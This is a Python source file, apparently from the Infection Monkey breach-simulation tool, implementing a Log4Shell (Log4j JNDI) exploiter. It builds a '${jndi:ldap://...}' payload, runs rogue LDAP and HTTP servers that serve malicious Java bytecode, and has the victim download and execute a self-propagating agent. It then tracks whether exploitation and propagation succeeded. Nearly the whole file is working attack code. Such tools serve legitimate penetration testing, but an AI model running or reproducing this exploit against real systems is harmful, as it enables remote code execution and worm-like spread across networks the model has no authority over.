import logging
import time
from pathlib import PurePath

from common import OperatingSystem
from common.common_consts.timeouts import LONG_REQUEST_TIMEOUT, MEDIUM_REQUEST_TIMEOUT
from common.utils import Timer
from infection_monkey.exploit.log4shell_utils import (
    LINUX_EXPLOIT_TEMPLATE_PATH,
    WINDOWS_EXPLOIT_TEMPLATE_PATH,
    ExploitClassHTTPServer,
    LDAPExploitServer,
    build_exploit_bytecode,
    get_log4shell_service_exploiters,
)
from infection_monkey.exploit.tools.helpers import get_agent_dst_path
from infection_monkey.exploit.tools.http_tools import HTTPTools
from infection_monkey.exploit.web_rce import WebRCE
from infection_monkey.i_puppet.i_puppet import ExploiterResultData
from infection_monkey.model import DROPPER_ARG, LOG4SHELL_LINUX_COMMAND, LOG4SHELL_WINDOWS_COMMAND
from infection_monkey.network.info import get_free_tcp_port
from infection_monkey.network.tools import get_interface_to_target
from infection_monkey.utils.commands import build_monkey_commandline
from infection_monkey.utils.monkey_dir import get_monkey_dir_path
from infection_monkey.utils.threading import interruptible_iter

logger = logging.getLogger(__name__)


class Log4ShellExploiter(WebRCE):
    _EXPLOITED_SERVICE = "Log4j"
    SERVER_SHUTDOWN_TIMEOUT = LONG_REQUEST_TIMEOUT
    REQUEST_TO_VICTIM_TIMEOUT = MEDIUM_REQUEST_TIMEOUT

    def _exploit_host(self) -> ExploiterResultData:
        self._open_ports = [
            int(port[0]) for port in WebRCE.get_open_service_ports(self.host, self.HTTP, ["http"])
        ]

        if not self._open_ports:
            logger.info("Could not find any open web ports to exploit")
            self.publish_exploitation_event(
                target=self.host.ip_addr,
                exploitation_success=False,
            )
            return self.exploit_result

        self._configure_servers()
        self._start_servers()
        try:
            self.exploit(None, None)
            if self._is_interrupted():
                self._set_interrupted()
            return self.exploit_result
        finally:
            self._stop_servers()

    def _configure_servers(self):
        self._ldap_port = get_free_tcp_port()

        self._class_http_server_ip = get_interface_to_target(self.host.ip_addr)
        self._class_http_server_port = get_free_tcp_port()

        self._ldap_server = None
        self._exploit_class_http_server = None
        self._agent_http_server_thread = None

    def _start_servers(self):
        target_path = get_agent_dst_path(self.host)

        # Start http server, to serve agent to victims
        agent_http_path = self._start_agent_http_server(target_path)

        # Build agent execution command
        command = self._build_command(target_path, agent_http_path)

        # Start http server to serve malicious java class to victim
        self._start_class_http_server(command)

        # Start ldap server to redirect ldap query to java class server
        self._start_ldap_server()

    def _start_agent_http_server(self, dropper_target_path) -> str:
        # Create server for http download and wait for it's startup.
        http_path, http_thread = HTTPTools.try_create_locked_transfer(
            self.host, dropper_target_path, self.agent_binary_repository
        )
        self._agent_http_server_thread = http_thread
        return http_path

    def _start_class_http_server(self, command: str):
        java_class = self._build_java_class(command)

        self._exploit_class_http_server = ExploitClassHTTPServer(
            self._class_http_server_ip, self._class_http_server_port, java_class
        )
        self._exploit_class_http_server.run()

    def _start_ldap_server(self):
        self._ldap_server = LDAPExploitServer(
            ldap_server_port=self._ldap_port,
            http_server_ip=self._class_http_server_ip,
            http_server_port=self._class_http_server_port,
            storage_dir=get_monkey_dir_path(),
        )
        self._ldap_server.run()

    def _stop_servers(self):
        logger.debug("Stopping all LDAP and HTTP Servers")
        self._agent_http_server_thread.stop(Log4ShellExploiter.SERVER_SHUTDOWN_TIMEOUT)

        self._exploit_class_http_server.stop(Log4ShellExploiter.SERVER_SHUTDOWN_TIMEOUT)

        self._ldap_server.stop(Log4ShellExploiter.SERVER_SHUTDOWN_TIMEOUT)

    def _build_ldap_payload(self) -> str:
        interface_ip = get_interface_to_target(self.host.ip_addr)
        return f"${{jndi:ldap://{interface_ip}:{self._ldap_port}/dn=Exploit}}"

    def _build_command(self, path: PurePath, http_path) -> str:
        # Build command to execute
        monkey_cmd = build_monkey_commandline(self.servers, self.current_depth + 1, location=path)
        if self.host.is_windows():
            base_command = LOG4SHELL_WINDOWS_COMMAND
        else:
            base_command = LOG4SHELL_LINUX_COMMAND

        return base_command % {
            "monkey_path": path,
            "http_path": http_path,
            "monkey_type": DROPPER_ARG,
            "parameters": monkey_cmd,
        }

    def _build_java_class(self, exploit_command: str) -> bytes:
        if OperatingSystem.LINUX == self.host.os["type"]:
            return build_exploit_bytecode(exploit_command, LINUX_EXPLOIT_TEMPLATE_PATH)
        else:
            return build_exploit_bytecode(exploit_command, WINDOWS_EXPLOIT_TEMPLATE_PATH)

    def exploit(self, url, command) -> None:
        # Try to exploit all services,
        # because we don't know which services are running and on which ports
        for exploit in get_log4shell_service_exploiters():
            intr_ports = interruptible_iter(self._open_ports, self.interrupt)
            for port in intr_ports:

                logger.debug(
                    f'Attempting Log4Shell exploit on for service "{exploit.service_name}"'
                    f"on port {port}"
                )
                try:
                    url = exploit.trigger_exploit(self._build_ldap_payload(), self.host, port)
                except Exception as err:
                    error_message = "An error occurred while attempting to exploit log4shell on a "
                    f"potential {exploit.service_name} service: {err}"

                    logger.warning(error_message)

                    self.publish_exploitation_event(
                        target=self.host.ip_addr,
                        exploitation_success=False,
                        error_message=error_message,
                    )

                if self._wait_for_victim():
                    self.exploit_info["vulnerable_service"] = {
                        "service_name": exploit.service_name,
                        "port": port,
                    }
                    self.exploit_info["vulnerable_urls"].append(url)

    def _wait_for_victim(self) -> bool:
        victim_called_back = self._wait_for_victim_to_download_java_bytecode()
        if victim_called_back:
            self._wait_for_victim_to_download_agent()

        return victim_called_back

    def _wait_for_victim_to_download_java_bytecode(self) -> bool:
        timer = Timer()
        timer.set(Log4ShellExploiter.REQUEST_TO_VICTIM_TIMEOUT)

        while not timer.is_expired():
            if self._exploit_class_http_server.exploit_class_downloaded():
                self.publish_exploitation_event(
                    target=self.host.ip_addr,
                    exploitation_success=True,
                )
                self.exploit_result.exploitation_success = True
                return True

            time.sleep(1)

        logger.debug("Timed out while waiting for victim to download the java bytecode")
        return False

    def _wait_for_victim_to_download_agent(self):
        timer = Timer()
        timer.set(LONG_REQUEST_TIMEOUT)

        while not timer.is_expired():
            if self._agent_http_server_thread.downloads > 0:
                self.publish_propagation_event(
                    target=self.host.ip_addr,
                    propagation_success=True,
                )
                self.exploit_result.propagation_success = True
                break

            # TODO: if the http server got an error we're waiting for nothing here
            time.sleep(1)
